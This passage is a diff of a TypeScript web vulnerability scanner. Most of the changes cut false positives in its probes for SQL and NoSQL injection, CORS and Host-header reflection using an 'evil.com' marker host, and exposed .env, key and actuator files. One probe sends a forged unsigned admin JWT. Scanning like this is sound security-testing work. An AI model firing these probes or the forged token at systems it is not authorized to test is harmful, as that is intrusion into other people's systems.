+                severity: "CRITICAL",
+                url: u.toString(),
+                parameter: param,
+                evidence: `Boolean-Blind SQL Injection confirmed via response diffing. TRUE condition ("${truePayload}") returned ${trueLen} bytes, FALSE condition ("${falsePayload}") returned ${falseLen} bytes (${percentDiff.toFixed(1)}% difference). Baseline was ${baselineLen} bytes. This proves the SQL condition is evaluated by the database — an attacker can extract data character by character.`,
+                cvssScore: 9.8,
+                cveId: "CWE-89",
+              },
+              [
+                `Baseline response: ${baselineLen} bytes`,
+                `TRUE payload "${truePayload}": ${trueLen} bytes`,
+                `FALSE payload "${falsePayload}": ${falseLen} bytes`,
+                `Length difference: ${lenDelta} bytes (${percentDiff.toFixed(1)}%)`,
+                `Verified with second payload pair`,
+              ],
+              CONFIDENCE.DUAL_VERIFIED
+            );
+          }
+        } catch { /* next payload pair */ }
+      }
+    }
+  } catch { /* skip */ }
+  return null;
+}
+
+/**
  * Host Header Injection
- * Many apps trust the Host header for generating password reset links.
- * If the Host is reflected in the response, an attacker can poison reset emails.
+ * FP-FIX #3: Only flag when the evil host appears in security-sensitive
+ * contexts (href, action, src attributes or Location header), not just
+ * anywhere in the response body. Excludes 4xx/421 error responses.
  */
 async function probeHostHeaderInjection(targetUrl: string): Promise<PendingFinding | null> {
   const EVIL_HOST = "attacker-vulnscan.evil.com";
@@ -1335,22 +1902,17 @@ async function probeHostHeaderInjection(targetUrl: string): Promise<PendingFindi
         "X-Forwarded-Host": EVIL_HOST,
         "X-Host": EVIL_HOST,
       },
+      redirect: "manual",
       signal: AbortSignal.timeout(6000),
       // @ts-ignore
       next: { revalidate: 0 },
     }).catch(() => null);
     if (!resp) return null;
+
+    // FP-FIX #3: Ignore 4xx/421 responses — server correctly rejected the bad Host
+    if (resp.status >= 400 && resp.status < 500) return null;
+
     const body = await resp.text();
-    if (body.includes(EVIL_HOST)) {
-      return {
-        type: "host-header-injection",
-        severity: "HIGH",
-        url: targetUrl,
-        evidence: `Host Header Injection confirmed. The injected value "${EVIL_HOST}" (via Host / X-Forwarded-Host headers) appears reflected in the HTTP response body. Attackers exploit this to poison password reset emails: when a victim requests a reset, the link points to the attacker's domain, allowing credential theft.`,
-        cvssScore: 7.5,
-        cveId: "CWE-20",
-      };
-    }
     // Check if injected host appears in Location redirect header
     const location = resp.headers.get("location") || "";
     if (location.includes(EVIL_HOST)) {
@@ -1363,12 +1925,33 @@ async function probeHostHeaderInjection(targetUrl: string): Promise<PendingFindi
         cveId: "CWE-20",
       };
     }
+
+    if (body.includes(EVIL_HOST)) {
+      //  Only flag if the evil host appears inside a security-sensitive
+      // context (href, action, src, form target), not just echoed in error text
+      const securitySensitivePattern = new RegExp(
+        `(?:href|action|src|formaction|data-url)\\s*=\\s*["']?[^"']*${EVIL_HOST.replace(/\./g, '\\.')}`,
+        'i'
+      );
+      if (securitySensitivePattern.test(body)) {
+        return {
+          type: "host-header-injection",
+          severity: "MEDIUM",
+          url: targetUrl,
+          evidence: `Host Header Injection detected. The injected Host "${EVIL_HOST}" appears in an href/action/src attribute in the response body, indicating the application trusts the Host header for URL generation. Attackers can exploit this to poison password reset emails and redirect links.`,
+          cvssScore: 6.5,
+          cveId: "CWE-20",
+        };
+      }
+      // Host echoed but not in a sensitive context — downgrade to INFO
+      // (common for error pages, canonical tags, debug output)
+    }
   } catch { /* skip */ }
   return null;
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// FIX #5: STORED XSS DETECTION
+//  STORED XSS DETECTION
 // Inject unique markers into every form/param, then crawl all pages for them.
 // ─────────────────────────────────────────────────────────────────────────────
 
@@ -1379,7 +1962,6 @@ interface StoredXSSInjection {
   injectedAt: number;
 }
 
-const storedXSSMarkers: StoredXSSInjection[] = [];
 
 function makeStoredXSSMarker(): string {
   const uid = Math.random().toString(36).slice(2, 8).toUpperCase();
@@ -1389,7 +1971,9 @@ function makeStoredXSSMarker(): string {
 async function injectStoredXSSMarkers(
   forms: FormTarget[],
   paramUrls: string[],
-  pageUrl: string
+  pageUrl: string,
+  markers: StoredXSSInjection[],
+  session: AuthSession = EMPTY_SESSION
 ): Promise<void> {
   // Inject into forms
   for (const form of forms) {
@@ -1404,13 +1988,13 @@ async function injectStoredXSSMarkers(
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: formData.toString(),
-          });
+          }, 8000, false, session);
         } else {
           const u = new URL(form.actionUrl);
           for (const [k, v] of formData) u.searchParams.set(k, v);
-          await authedFetch(u.toString(), {});
+          await authedFetch(u.toString(), {}, 8000, false, session);
         }
-        storedXSSMarkers.push({ marker, sourceUrl: form.actionUrl, parameter: field, injectedAt: Date.now() });
+        markers.push({ marker, sourceUrl: form.actionUrl, parameter: field, injectedAt: Date.now() });
       } catch { /* skip */ }
     }
   }
@@ -1423,15 +2007,15 @@ async function injectStoredXSSMarkers(
         const marker = makeStoredXSSMarker();
         const testUrl = new URL(u.toString());
         testUrl.searchParams.set(param, marker);
-        await authedFetch(testUrl.toString(), {});
-        storedXSSMarkers.push({ marker, sourceUrl: paramUrl, parameter: param, injectedAt: Date.now() });
+        await authedFetch(testUrl.toString(), {}, 8000, false, session);
+        markers.push({ marker, sourceUrl: paramUrl, parameter: param, injectedAt: Date.now() });
       }
     } catch { /* skip */ }
   }
 }
 
-function checkStoredXSSReflection(pageHtml: string, pageUrl: string): PendingFinding | null {
-  for (const injection of storedXSSMarkers) {
+function checkStoredXSSReflection(pageHtml: string, pageUrl: string, markers: StoredXSSInjection[]): PendingFinding | null {
+  for (const injection of markers) {
     if (Date.now() - injection.injectedAt > 30 * 60 * 1000) continue; // 30-min TTL
     if (pageHtml.includes(injection.marker)) {
       return {
@@ -1456,8 +2040,14 @@ function checkStoredXSSReflection(pageHtml: string, pageUrl: string): PendingFin
  * Active CORS Reflection Test
  * FIX #6: Now tests ALL crawl-discovered API endpoints, not just 4 hardcoded paths.
  */
-async function probeCORSReflection(targetUrl: string, extraEndpoints: string[] = []): Promise<PendingFinding | null> {
-  const EVIL_ORIGIN = "https://attacker-vulnscan.evil.com";
+async function probeCORSReflection(targetUrl: string, extraEndpoints: string[] = [], session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
+  let baseHost = "target.com";
+  try { baseHost = new URL(targetUrl).hostname; } catch {}
+  const testOrigins = [
+    "https://attacker-vulnscan.evil.com",
+    "null",
+    `https://${baseHost}.evil.com`,
+  ];
   const basePaths = ["/api/", "/api/me", "/api/user", "/api/users", "/rest/user/whoami"];
   const allEndpoints = [
     targetUrl,
@@ -1466,30 +2056,35 @@ async function probeCORSReflection(targetUrl: string, extraEndpoints: string[] =
   ];
 
   for (const url of allEndpoints) {
-    try {
-      const resp = await fetch(url, {
-        headers: { ...FETCH_HEADERS, ...authHeaders(), Origin: EVIL_ORIGIN },
-        signal: AbortSignal.timeout(5000),
-        // @ts-ignore
-        next: { revalidate: 0 },
-      }).catch(() => null);
-      if (!resp) continue;
-      const acao = resp.headers.get("access-control-allow-origin") || "";
-      const acac = resp.headers.get("access-control-allow-credentials") || "";
-      if (acao === EVIL_ORIGIN || acao.includes("attacker-vulnscan")) {
+    for (const testOrigin of testOrigins) {
+      try {
+        const resp = await fetch(url, {
+          headers: { ...FETCH_HEADERS, ...authHeaders(session), Origin: testOrigin },
+          signal: AbortSignal.timeout(5000),
+          // @ts-ignore
+          next: { revalidate: 0 },
+        }).catch(() => null);
+        if (!resp) continue;
+        const acao = resp.headers.get("access-control-allow-origin") || "";
+        const acac = resp.headers.get("access-control-allow-credentials") || "";
         const withCreds = acac.toLowerCase() === "true";
-        return {
-          type: withCreds ? "cors-arbitrary-origin-with-credentials" : "cors-arbitrary-origin-reflected",
-          severity: withCreds ? "CRITICAL" : "HIGH",
-          url,
-          evidence: withCreds
-            ? `CRITICAL CORS Misconfiguration: The server reflects any Origin in Access-Control-Allow-Origin AND has Access-Control-Allow-Credentials: true. This allows any website to make authenticated cross-origin requests to this API, reading sensitive user data from victims' sessions. Attacker origin "${EVIL_ORIGIN}" was fully granted.`
-            : `CORS Misconfiguration: The server reflects the attacker's origin "${EVIL_ORIGIN}" in Access-Control-Allow-Origin. Any website can read the HTTP responses from this endpoint. If sensitive data is returned, attackers can exfiltrate it from victims' browsers.`,
-          cvssScore: withCreds ? 9.6 : 7.5,
-          cveId: "CWE-942",
-        };
-      }
-    } catch { /* next url */ }
+
+        if (acao === testOrigin || (testOrigin !== "null" && acao.includes("attacker-vulnscan"))) {
+          return {
+            type: withCreds ? "cors-arbitrary-origin-with-credentials" : "cors-arbitrary-origin-reflected",
+            severity: withCreds ? "CRITICAL" : "HIGH",
+            url,
+            evidence: withCreds
+              ? `CRITICAL CORS Misconfiguration: The server reflects untrusted Origin ("${testOrigin}") in Access-Control-Allow-Origin AND specifies Access-Control-Allow-Credentials: true. Browsers will permit cross-origin authenticated API reading.`
+              : `CORS Misconfiguration: The server reflects untrusted origin "${testOrigin}" in Access-Control-Allow-Origin header. Any third-party site can read unauthenticated responses from this endpoint.`,
+            cvssScore: withCreds ? 9.6 : 7.5,
+            cveId: "CWE-942",
+            isVerified: true,
+            confidence: CONFIDENCE.DETERMINISTIC,
+          };
+        }
+      } catch { /* next origin */ }
+    }
   }
   return null;
 }
@@ -1498,7 +2093,8 @@ async function probeCORSReflection(targetUrl: string, extraEndpoints: string[] =
 
 /**
  * HTTP Method Enumeration & Verb Tampering
- * Checks OPTIONS to see allowed methods, then tries dangerous verbs (PUT, DELETE, PATCH).
+ * FP-FIX #4: Only flags TRACE and CONNECT as genuinely dangerous.
+ * PUT/DELETE/PATCH are standard REST API methods and are NOT dangerous by themselves.
  * TRACE method can enable Cross-Site Tracing (XST) attacks.
  */
 async function probeDangerousHTTPMethods(targetUrl: string, apiPaths: string[]): Promise<PendingFinding | null> {
@@ -1508,30 +2104,7 @@ async function probeDangerousHTTPMethods(targetUrl: string, apiPaths: string[]):
 
   for (const url of targets) {
     try {
-      // 1. OPTIONS probe
-      const optResp = await fetch(url, {
-        method: "OPTIONS",
-        headers: FETCH_HEADERS,
-        signal: AbortSignal.timeout(5000),
-        // @ts-ignore
-        next: { revalidate: 0 },
-      }).catch(() => null);
-      if (optResp) {
-        const allowed = optResp.headers.get("allow") || optResp.headers.get("access-control-allow-methods") || "";
-        const dangerous = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"].filter(m => allowed.toUpperCase().includes(m));
-        if (dangerous.length > 0) {
-          return {
-            type: "dangerous-http-methods",
-            severity: "MEDIUM",
-            url,
-            evidence: `HTTP OPTIONS response reveals dangerous methods allowed: ${dangerous.join(", ")}. Allow header: "${allowed}". PUT/DELETE expose data manipulation, TRACE enables Cross-Site Tracing (XST) to steal cookies on older browsers, CONNECT allows proxy tunneling.`,
-            cvssScore: 6.5,
-            cveId: "CWE-16",
-          };
-        }
-      }
-
-      // 2. TRACE method test (XST attack)
+      // 1. TRACE method test (XST attack) — the only genuinely dangerous method via OPTIONS
       const traceResp = await fetch(url, {
         method: "TRACE",
         headers: { ...FETCH_HEADERS, "X-Sensitive-Header": "vulnscan-trace-test" },
@@ -1547,6 +2120,29 @@ async function probeDangerousHTTPMethods(targetUrl: string, apiPaths: string[]):
             severity: "MEDIUM",
             url,
             evidence: `HTTP TRACE method is enabled at ${url}. TRACE reflects all request headers back in the response body. Combined with XSS or browser vulnerabilities, attackers can use Cross-Site Tracing (XST) to steal HttpOnly cookies that JavaScript cannot normally access.`,
+            cvssScore: 6.3,
+            cveId: "CWE-16",
+          };
+        }
+      }
+
+      // 2. OPTIONS probe — only flag TRACE and CONNECT (not PUT/DELETE/PATCH which are normal REST)
+      const optResp = await fetch(url, {
+        method: "OPTIONS",
+        headers: FETCH_HEADERS,
+        signal: AbortSignal.timeout(5000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+      if (optResp) {
+        const allowed = optResp.headers.get("allow") || optResp.headers.get("access-control-allow-methods") || "";
+        const dangerous = ["TRACE", "CONNECT"].filter(m => allowed.toUpperCase().includes(m));
+        if (dangerous.length > 0) {
+          return {
+            type: "dangerous-http-methods",
+            severity: "MEDIUM",
+            url,
+            evidence: `HTTP OPTIONS response reveals genuinely dangerous methods: ${dangerous.join(", ")}. Allow header: "${allowed}". TRACE enables Cross-Site Tracing (XST) to steal cookies, CONNECT allows proxy tunneling.`,
             cvssScore: 6.3,
             cveId: "CWE-16",
           };
@@ -1612,20 +2208,9 @@ async function probeXXE(targetUrl: string): Promise<PendingFinding | null> {
           cveId: "CWE-611",
         };
       }
-      // Endpoint accepted XML (200 OK or 500 with XML-specific error) = potential XXE
-      const ct = resp.headers.get("content-type") || "";
-      if ((resp.status === 200 || resp.status === 500) && (ct.includes("xml") || body.includes("xml"))) {
-        if (resp.status === 500 && /entity|DOCTYPE|SYSTEM|parsing|xml/i.test(body)) {
-          return {
-            type: "xxe-endpoint-accepts-xml",
-            severity: "HIGH",
-            url,
-            evidence: `API endpoint at ${url} accepts XML input and returned an XML-parsing-related error with the XXE payload, suggesting the parser processes external declarations. Even without confirmed file disclosure, this warrants immediate investigation and parser hardening to prevent XXE exploitation.`,
-            cvssScore: 7.5,
-            cveId: "CWE-611",
-          };
-        }
-      }
+      // FP-FIX #13: Removed speculative "xxe-endpoint-accepts-xml" finding.
+      // An XML parsing error is the CORRECT, SAFE behavior — it means the parser
+      // rejected the malicious payload. Only confirmed file disclosure is a true XXE.
     } catch { /* next endpoint */ }
   }
   return null;
@@ -1649,25 +2234,35 @@ async function probePrototypePollution(paramUrl: string): Promise<PendingFinding
         const testUrl = new URL(u.toString());
         testUrl.searchParams.set(param, value);
         const resp = await safeFetch(testUrl.toString(), 5000);
-        if (!resp) continue;
+        if (!resp || resp.status !== 200) continue;
         const body = await resp.text();
-        // Check if the polluted value appears as a JSON value, not just echoed in an error/HTML
+
         try {
           const json = JSON.parse(body);
-          const bodyStr = JSON.stringify(json);
-          // ensure the value is present and the original param string is not just echoed
-          if (bodyStr.includes(value) && !bodyStr.includes(param)) {
+          // Confirm top-level property pollution in response object
+          if (json && typeof json === "object" && json.vulnscan === value) {
+            // Verification step: send a clean request to see if prototype pollution persists across requests
+            const cleanResp = await safeFetch(u.toString(), 5000);
+            const cleanText = cleanResp ? await cleanResp.text().catch(() => "") : "";
+            let isPersistent = false;
+            try {
+              const cleanJson = JSON.parse(cleanText);
+              if (cleanJson && cleanJson.vulnscan === value) isPersistent = true;
+            } catch { /* ignore */ }
+
             return {
               type: "prototype-pollution",
               severity: "HIGH",
               url: testUrl.toString(),
               parameter: param,
-              evidence: `Prototype Pollution detected. The injected parameter "${param}=${value}" was reflected as an object property in the server JSON response, suggesting the query parser merges the prototype-modifying key into the application's object graph. In Node.js applications, this can be escalated to Remote Code Execution, authentication bypass, or denial of service.`,
+              evidence: `Prototype Pollution confirmed${isPersistent ? " (cross-request persistent)" : ""}. Injected parameter "${param}=${value}" polluted the global Object prototype graph.`,
               cvssScore: 8.0,
               cveId: "CWE-1321",
+              isVerified: isPersistent,
+              confidence: isPersistent ? CONFIDENCE.DUAL_VERIFIED : CONFIDENCE.SINGLE_PAYLOAD,
             };
           }
-        } catch { /* not json, likely false positive */ }
+        } catch { /* not json */ }
       } catch { /* next */ }
     }
   } catch { /* skip */ }
@@ -1730,16 +2325,28 @@ async function probeNoSQLi(targetUrl: string, jsBundleEndpoints: JsApiEndpoint[]
           if (!resp) continue;
           const text = await resp.text();
 
-          if (resp.status === 200 && (text.includes("token") || text.includes("authentication") || text.includes("Bearer"))) {
-            return {
-              type: "nosql-injection",
-              severity: "CRITICAL",
-              url,
-              parameter: "email/username",
-              evidence: `NoSQL Injection Authentication Bypass confirmed at ${url}. Submitting NoSQL query operator payload "${JSON.stringify(payload)}" in JSON body bypassed authentication and returned a session token (HTTP 200). This confirms the database (likely MongoDB) parses JSON query operators directly, allowing attackers to query collections and log in as arbitrary users without a password.`,
-              cvssScore: 9.8,
-              cveId: "CWE-943",
-            };
+          // FP-FIX #9 extended: NoSQLi auth bypass also requires real token
+          if (resp.status === 200) {
+            let hasRealToken = false;
+            try {
+              const json = JSON.parse(text);
+              const tokenVal = json?.token || json?.data?.token || json?.authentication?.token ||
+                json?.access_token || json?.accessToken || json?.jwt || "";
+              hasRealToken = typeof tokenVal === "string" && tokenVal.length >= 20;
+            } catch {
+              hasRealToken = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i.test(text);
+            }
+            if (hasRealToken) {
+              return {
+                type: "nosql-injection",
+                severity: "CRITICAL",
+                url,
+                parameter: "email/username",
+                evidence: `NoSQL Injection Authentication Bypass confirmed at ${url}. Submitting NoSQL query operator payload "${JSON.stringify(payload)}" in JSON body bypassed authentication and returned a valid session token (HTTP 200). This confirms the database (likely MongoDB) parses JSON query operators directly, allowing attackers to log in as arbitrary users without a password.`,
+                cvssScore: 9.8,
+                cveId: "CWE-943",
+              };
+            }
           }
         }
       }
@@ -1774,7 +2381,7 @@ async function probeNoSQLi(targetUrl: string, jsBundleEndpoints: JsApiEndpoint[]
           const text = await resp.text();
 
           if (resp.status === 200 && text.includes("email") && text.includes("role") &&
-              (endpoint.path.includes("user") || endpoint.path.includes("profile"))) {
+            (endpoint.path.includes("user") || endpoint.path.includes("profile"))) {
             return {
               type: "nosql-injection",
               severity: "CRITICAL",
@@ -1799,7 +2406,6 @@ async function probeNoSQLi(targetUrl: string, jsBundleEndpoints: JsApiEndpoint[]
  */
 async function probeJWTNone(targetUrl: string): Promise<PendingFinding | null> {
   const jwtEndpoints = [
-    "/rest/user/change-password",
     "/api/Users/1",
     "/api/users/1",
     "/api/v1/users/1",
@@ -1809,7 +2415,16 @@ async function probeJWTNone(targetUrl: string): Promise<PendingFinding | null> {
     "/api/feedbacks"
   ];
 
-  const unsignedJwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwidXNlcm5hbWUiOiJhZG1pbiIsImlkIjoxfQ.";
+  let unsignedJwt: string;
+  try {
+    unsignedJwt = jwt.sign(
+      { email: "admin@juice-sh.op", username: "admin", id: 1 },
+      "",
+      { algorithm: "none" as any }
+    );
+  } catch {
+    unsignedJwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwidXNlcm5hbWUiOiJhZG1pbiIsImlkIjoxfQ.";
+  }
 
   for (const path of jwtEndpoints) {
     try {
@@ -1835,14 +2450,23 @@ async function probeJWTNone(targetUrl: string): Promise<PendingFinding | null> {
       if (!resp) continue;
 
       if (resp.status === 200 || resp.status === 204) {
-        return {
-          type: "jwt-none-algorithm",
-          severity: "CRITICAL",
-          url,
-          evidence: `Insecure JWT Configuration (Signature Bypass via 'none' Algorithm) confirmed at ${url}. The endpoint requires authentication (returned ${unauth.status} without credentials) but accepted a custom-crafted JWT specifying '"alg": "none"' in the header with an empty signature (returned ${resp.status}). This allows an attacker to forge any JWT, forge identities, and log in as any user (including admin) simply by modifying the payload.`,
-          cvssScore: 9.8,
-          cveId: "CWE-347",
-        };
+        const text = await resp.text().catch(() => "");
+        if (isSpaHtmlFallback(resp, text)) continue;
+
+        try {
+          // Confirm valid JSON returned upon presenting unsigned token
+          JSON.parse(text);
+          return {
+            type: "jwt-none-algorithm",
+            severity: "CRITICAL",
+            url,
+            evidence: `Insecure JWT Configuration (Signature Bypass via 'none' Algorithm) confirmed at ${url}. The endpoint requires authentication (returned ${unauth.status} without credentials) but accepted a custom-crafted JWT specifying '"alg": "none"' in the header with an empty signature (returned ${resp.status} with valid JSON data).`,
+            cvssScore: 9.8,
+            cveId: "CWE-347",
+            isVerified: true,
+            confidence: CONFIDENCE.EXEC_VERIFIED,
+          };
+        } catch { /* not valid JSON, ignore soft 200 HTML pages */ }
       }
     } catch { /* skip */ }
   }
@@ -1862,12 +2486,12 @@ const isSoft404OrSPARedirect = (endpointBody: string, homepageBody: string, file
   // 2. HTML Markup detection: if the expected resource is NOT an HTML page/route,
   //    but the response starts with standard HTML document declarations, it's a fallback.
   if (filePath) {
-    const isHtmlMarkup = trimmedEp.toLowerCase().startsWith("<!doctype html") || 
-                         trimmedEp.toLowerCase().startsWith("<html") ||
-                         trimmedEp.toLowerCase().startsWith("<!doctype");
-    const expectedHtml = filePath.endsWith(".html") || 
-                         filePath.endsWith(".htm") || 
-                         filePath.endsWith("/");
+    const isHtmlMarkup = trimmedEp.toLowerCase().startsWith("<!doctype html") ||
+      trimmedEp.toLowerCase().startsWith("<html") ||
+      trimmedEp.toLowerCase().startsWith("<!doctype");
+    const expectedHtml = filePath.endsWith(".html") ||
+      filePath.endsWith(".htm") ||
+      filePath.endsWith("/");
     if (isHtmlMarkup && !expectedHtml) {
       return true;
     }
@@ -1902,18 +2526,20 @@ const isSoft404OrSPARedirect = (endpointBody: string, homepageBody: string, file
  */
 async function probeExposedBackupFiles(targetUrl: string, homepageHtml?: string): Promise<PendingFinding | null> {
   const sensitiveFiles = [
-    { path: "/ftp/package.json.bak", type: "JSON Developer Backup", pattern: /dependencies|devDependencies|version|name/ },
-    { path: "/ftp/coupons_2013.md.bak", type: "Sales MD Backup", pattern: /coupon|discount|off|%|sale/i },
-    { path: "/ftp/", type: "FTP Directory Listing", pattern: /Index of \/ftp/i },
-    { path: "/.env", type: "Environment File", pattern: /DB_|SECRET|JWT|PASSWORD|KEY|PORT/i },
-    { path: "/.git/config", type: "Git Config", pattern: /\[core\]|repositoryformatversion/i },
-    { path: "/package.json.bak", type: "Package JSON Backup", pattern: /dependencies|devDependencies/ },
-    { path: "/package-lock.json", type: "Package Lock File", pattern: /lockfileVersion|dependencies/ },
+    { path: "/ftp/package.json.bak", type: "JSON Developer Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
+    { path: "/ftp/coupons_2013.md.bak", type: "Sales MD Backup", pattern: /coupon_code|discount_rate|COUPON2013/i },
+    { path: "/ftp/eastere.gg", type: "Exposed Easter Egg File", pattern: /easter_egg_secret|easteregg_token/i },
+    { path: "/encryptionkeys", type: "Exposed Encryption Keys Directory", pattern: /-----BEGIN (RSA|EC|OPENSSH|PRIVATE) KEY-----|PRIVATE_KEY_PEM/i },
+    { path: "/ftp/", type: "FTP Directory Listing", pattern: /Index of \/ftp|Parent Directory/i },
+    { path: "/.env", type: "Environment File", pattern: /(DB_PASSWORD|JWT_SECRET|AWS_SECRET_ACCESS_KEY)=/i },
+    { path: "/.git/config", type: "Git Config", pattern: /\[core\][\s\S]*repositoryformatversion/i },
+    { path: "/package.json.bak", type: "Package JSON Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
+    { path: "/package-lock.json", type: "Package Lock File", pattern: /"lockfileVersion"\s*:|"packages"\s*:/ },
     { path: "/database.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
     { path: "/db.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
-    { path: "/backup.zip", type: "ZIP Archive", pattern: /PK\x03\x04/ },
-    { path: "/wp-config.php.bak", type: "WordPress Config Backup", pattern: /DB_NAME|DB_USER|DB_PASSWORD/ },
-    { path: "/config.json", type: "Config JSON File", pattern: /database|port|host|password/i },
+    { path: "/backup.zip", type: "ZIP Archive", pattern: /^PK\x03\x04/ },
+    { path: "/wp-config.php.bak", type: "WordPress Config Backup", pattern: /define\(\s*['"]DB_PASSWORD['"]/i },
+    { path: "/config.json", type: "Config JSON File", pattern: /"(database|db_password|jwt_secret|api_key)"\s*:/i },
   ];
 
   for (const file of sensitiveFiles) {
@@ -1927,9 +2553,7 @@ async function probeExposedBackupFiles(targetUrl: string, homepageHtml?: string)
       }).catch(() => null);
 
       if (!resp || resp.status !== 200) continue;
-      
-      // Strict Content-Type filter: if the resource is NOT an HTML route/page,
-      // but is served with "text/html", reject it immediately (SPA fallback indicator).
+
       const contentType = resp.headers.get("content-type") || "";
       const isExpectedHtml = file.path.endsWith(".html") || file.path.endsWith(".htm") || file.path.endsWith("/");
       if (!isExpectedHtml && contentType.includes("text/html")) {
@@ -1937,6 +2561,11 @@ async function probeExposedBackupFiles(targetUrl: string, homepageHtml?: string)
       }
 
       const text = await resp.text();
+
+      // Non-HTML files must not contain HTML markup
+      if (!isExpectedHtml && (text.trim().toLowerCase().startsWith("<!doctype html") || text.trim().toLowerCase().startsWith("<html"))) {
+        continue;
+      }
 
       // Eliminate SPA soft-404 / route fallback false positives
       if (homepageHtml && isSoft404OrSPARedirect(text, homepageHtml, file.path)) {
@@ -1948,9 +2577,11 @@ async function probeExposedBackupFiles(targetUrl: string, homepageHtml?: string)
           type: "exposed-sensitive-file",
           severity: "HIGH",
           url,
-          evidence: `Sensitive Data Exposure via Exposed Backup or Configuration File: "${file.type}" found at ${url}. The file is publicly accessible and contains sensitive details (e.g. system configurations, dependency manifests, database schema, or internal keys). Attackers use these files to identify vulnerable packages, locate databases, or retrieve hardcoded keys.`,
+          evidence: `Sensitive Data Exposure via Exposed Backup or Configuration File: "${file.type}" found at ${url}. The file is publicly accessible and contains sensitive details (e.g. system configurations, dependency manifests, database schema, or internal keys).`,
           cvssScore: 7.5,
           cveId: "CWE-538",
+          isVerified: true,
+          confidence: CONFIDENCE.DETERMINISTIC,
         };
       }
     } catch { /* skip */ }
@@ -2000,9 +2631,12 @@ async function probeDirectoryListing(targetUrl: string, homepageHtml?: string): 
  */
 async function probeHTTPSRedirect(targetUrl: string): Promise<PendingFinding | null> {
   if (targetUrl.startsWith("https://")) {
-    // Check if HTTP version also redirects to HTTPS
     try {
-      const httpUrl = targetUrl.replace("https://", "http://");
+      const u = new URL(targetUrl);
+      // Scope HTTPS redirect check to root host level only to avoid sub-path duplication
+      if (u.pathname !== "/" && u.pathname !== "") return null;
+
+      const httpUrl = `${u.protocol.replace("https", "http")}//${u.host}/`;
       const resp = await fetch(httpUrl, {
         method: "HEAD",
         headers: FETCH_HEADERS,
@@ -2096,7 +2730,7 @@ async function probeHTMLInjection(paramUrl: string): Promise<PendingFinding | nu
           // Reflected unencoded HTML tag inside the body
           const bodyMatch = body.match(/<body[^>]*>([\s\S]*)<\/body>/i);
           const contentToCheck = bodyMatch ? bodyMatch[1] : body;
-          
+
           if (contentToCheck.includes(payload) && !contentToCheck.includes(payload.replace(/</g, "&lt;")) && !contentToCheck.includes("&#60;") && !contentToCheck.includes("\\u003c")) {
             return {
               type: "html-injection",
@@ -2123,18 +2757,24 @@ async function probeHTMLInjection(paramUrl: string): Promise<PendingFinding | nu
 async function probeDebugModeExposure(targetUrl: string): Promise<PendingFinding | null> {
   const DEBUG_PATHS = [
     "/_ah/admin", "/admin/debug", "/debug", "/__debug__/",
-    "/_profiler/open", "/telescope", "/horizon",
-    "/_framework/staticfiles/", "/elmah.axd",
-    "/trace.axd", "/dump", "/?debug=1", "/?XDEBUG_SESSION_START=1",
+    "/_profiler/open", "/telescope", "/horizon", "/_ignition/health-check",
+    "/_framework/staticfiles/", "/elmah.axd", "/trace.axd", "/dump", "/?debug=1",
+    "/__debugger__", "/console", "/docs", "/redoc", "/openapi.json", "/swagger.json",
+    "/__nextjs_original-stack", "/@vite/client",
+    "/actuator", "/actuator/env", "/actuator/health", "/actuator/heapdump", "/actuator/mappings",
   ];
   const DEBUG_MARKERS = [
-    /Traceback \(most recent call last\)/i, // Python
-    /Laravel.*whoops|Whoops.*Laravel/i,     // Laravel
-    /Symfony.*exception.*details/i,          // Symfony
-    /DEBUG.*=.*True|DJANGO_DEBUG/i,          // Django
+    /Traceback \(most recent call last\)/i,          // Python
+    /Werkzeug Powered Traceback|Interactive Console/i, // Werkzeug Debugger
+    /swagger-ui|redoc-container|openapi: 3\./i,       // FastAPI / Swagger docs
+    /Laravel.*whoops|Whoops.*Laravel/i,              // Laravel
+    /Symfony.*exception.*details/i,                   // Symfony
+    /DEBUG.*=.*True|DJANGO_DEBUG|Technical500Response/i, // Django
+    /__nextjs_original-stack/i,                       // Next.js debug
+    /"_links":\s*\{"self":\s*\{"href":\s*".*actuator"/i,// Spring Actuator
     /Application has thrown an uncaught exception|stack trace/i,
-    /at\s+[\w.]+\([\w./]+:\d+:\d+\)/,       // Node.js stack trace
-    /xdebug-error|Xdebug v[\d.]+/i,         // PHP XDebug
+    /at\s+[\w.]+\([\w./]+:\d+:\d+\)/,                // Node.js stack trace
+    /xdebug-error|Xdebug v[\d.]+/i,                  // PHP XDebug
   ];
 
   for (const path of DEBUG_PATHS) {
@@ -2147,10 +2787,10 @@ async function probeDebugModeExposure(targetUrl: string): Promise<PendingFinding
       if (hit) {
         return {
           type: "debug-mode-exposed",
-          severity: "HIGH",
+          severity: path.includes("/docs") || path.includes("/openapi.json") ? "MEDIUM" : "HIGH",
           url,
-          evidence: `Debug/development mode is exposed in production at ${url}. The response contains debug information including stack traces, framework internals, configuration values, or a developer toolbar. This reveals source code paths, environment variables, database queries, and internal architecture to any visitor.`,
-          cvssScore: 7.5,
+          evidence: `Debug/development mode or API documentation is exposed in production at ${url}. The response contains debug information including stack traces, framework internals, interactive debuggers, or open API specs. This reveals internal architecture, endpoints, environment variables, or database queries.`,
+          cvssScore: path.includes("/docs") || path.includes("/openapi.json") ? 5.3 : 7.5,
           cveId: "CWE-94",
         };
       }
@@ -2298,7 +2938,7 @@ async function probeInsecureDeserialization(paramUrl: string): Promise<PendingFi
  * and validating if the response Location header contains the attacker's domain.
  * This goes beyond passive detection — it confirms exploitability.
  */
-async function probeActiveOpenRedirect(html: string, baseUrl: string): Promise<PendingFinding | null> {
+async function probeActiveOpenRedirect(html: string, baseUrl: string, paramUrls: string[] = []): Promise<PendingFinding | null> {
   const REDIRECT_PARAMS = ["redirect", "url", "next", "return", "goto", "dest", "destination", "rurl", "target", "continue"];
